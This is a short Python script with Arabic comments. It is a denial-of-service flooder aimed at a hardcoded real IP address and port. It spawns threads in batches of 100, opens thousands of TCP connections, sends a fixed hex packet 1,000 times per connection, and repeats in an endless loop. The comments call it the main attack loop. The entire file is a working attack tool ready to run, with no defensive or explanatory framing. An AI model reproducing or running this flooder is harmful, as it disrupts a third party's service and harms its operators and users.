import socket
import threading
import time

# إعدادات الاتصال
ip = "57.129.39.129"  # عنوان IP الهدف
port = 10008  # المنفذ الهدف
num_connections = 9999  # إجمالي عدد الاتصالات
batch_size = 100  # عدد الاتصالات لكل دفعة
num_send_per_connection = 1000  # عدد الحزم المرسلة لكل اتصال

# الحزمة التي سيتم إرسالها
packet = bytes.fromhex("F10400010900000001000000F1")

# دالة لتنفيذ الاتصال وإرسال الحزم
def send_packets(ip, port, packet, num_send_per_connection):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            for i in range(num_send_per_connection):
                s.sendall(packet)
                print(f"Packet {i + 1} sent to {ip}:{port}")
        print(f"[+] Successful connection to {ip}:{port}")
    except Exception as e:
        print(f"[-] Error: {e}")

# حلقة الهجوم الرئيسية
try:
    while True:  # تشغيل مستمر حتى يتم الإيقاف يدويًا
        for i in range(0, num_connections, batch_size):
            threads = []
            for _ in range(batch_size):
                thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
                threads.append(thread)
                thread.start()

            # الانتظار حتى تنتهي جميع الـ Threads
            for thread in threads:
                thread.join()

            print(f"[+] Batch of {batch_size} connections completed. Sleeping for 1 second.")
            time.sleep(1)  # تأخير بسيط لتجنب استنزاف الموارد

except KeyboardInterrupt:
    print("\n[!] Program stopped by user. Exiting...")
